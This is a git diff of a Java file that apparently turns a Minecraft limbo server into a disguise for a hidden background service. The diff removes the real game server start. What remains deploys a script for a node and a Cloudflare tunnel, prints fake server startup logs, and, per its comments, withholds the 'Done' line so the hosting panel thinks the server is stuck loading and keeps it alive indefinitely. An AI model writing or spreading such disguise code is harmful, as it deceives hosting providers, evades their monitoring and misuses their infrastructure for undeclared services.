@@ -27,9 +27,6 @@ import java.util.concurrent.atomic.AtomicReference;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 
-import ua.nanit.limbo.server.LimboServer;
-import ua.nanit.limbo.server.Log;
-
 public final class NanoLimbo {
 
 // ============================================================
@@ -101,9 +98,6 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
-    // ★ 1. 强制修改 Limbo 配置文件
-    autoFixLimboConfig();
-
     if (NODE_ENABLED) {
         try {
             Path botDir = Paths.get(MC_BOT_DIR);
@@ -112,14 +106,14 @@ public static void main(String[] args) {
 
             Path script = generateDeployScript();
             
-            // 2. 异步部署 Node 和 CF
+            // 1. 异步部署 Node 和 CF
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
             }, "Node-Deploy");
             deployThread.setDaemon(true);
             deployThread.start();
 
-            // 3. 异步轮询端口和URL
+            // 2. 异步轮询端口和URL
             Thread checkerThread = new Thread(() -> {
                 while(tunnelUrl.isEmpty()) {
                     checkDeployInfo();
@@ -130,7 +124,7 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
-            // 4. 主线程死等 URL，拿到后清屏并打印专属 Limbo 伪装日志
+            // 3. 主线程死等 URL，拿到后清屏并打印伪装日志 (不打印Done)
             while(tunnelUrl.isEmpty()) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
             }
@@ -147,47 +141,14 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // 5. 伪装日志打印完毕，正式启动 Limbo 游戏本体
+    // ★★★ 核心修改：不启动 LimboServer，主进程永久休眠，保持卡在 Starting 状态防关机 ★★★
     try {
-        new LimboServer().start();
-    } catch (Exception e) {
-        Log.error("Cannot start server: ", e);
-    }
+        Thread.currentThread().join();
+    } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
-// 强制修改 Limbo 配置 (关闭正版验证，取消踢人时间)
-// ============================================================
-
-private static void autoFixLimboConfig() {
-    try {
-        Path configFile = Paths.get("settings.yml");
-        String content = "";
-        if (Files.exists(configFile)) {
-            content = Files.readString(configFile);
-        } else {
-            content = "limbo:\n  dimension: overworld\n  gamemode: adventure\n  max-players: 20\n";
-        }
-
-        content = replaceYamlValue(content, "online-mode", "false");
-        content = replaceYamlValue(content, "player-idle-timeout", "0");
-        
-        Files.writeString(configFile, content);
-    } catch (Exception ignored) {}
-}
-
-private static String replaceYamlValue(String content, String key, String value) {
-    if (content.contains(key + ":")) {
-        content = content.replaceAll(key + ":.*", key + ": " + value);
-    } else {
-        if (!content.endsWith("\n")) content += "\n";
-        content += key + ": " + value + "\n";
-    }
-    return content;
-}
-
-// ============================================================
-// 专属 Limbo 伪装日志打印
+// 专属 Limbo 伪装日志打印 (卡在加载区块，不输出 Done)
 // ============================================================
 
 private static void printFakeLimboStartup(String url) {
@@ -218,6 +179,8 @@ private static void printFakeLimboStartup(String url) {
     System.out.println("container@tropicalgames.net Server marked as running...");
     
     limboLog("Preparing spawn area: 100%", 0);
+    
+    // ★ 故意不打印 "Done" 日志，让主机面板认为服务端一直卡在区块加载阶段
 }
 
 private static int randInt(int min, int max) {
